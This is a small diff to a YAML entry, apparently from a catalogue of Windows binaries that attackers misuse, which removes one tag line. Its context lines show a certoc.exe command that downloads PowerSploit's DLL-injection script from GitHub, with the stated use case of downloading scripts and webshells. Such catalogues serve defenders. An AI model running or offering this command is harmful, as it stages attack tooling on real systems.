@@ -13,7 +13,6 @@ Commands:
     OperatingSystem: Windows Server 2022
     Tags:
       - Execute: DLL
-      - Input: Custom Format
   - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
     Description: Downloads text formatted files
     Usecase: Download scripts, webshells etc.
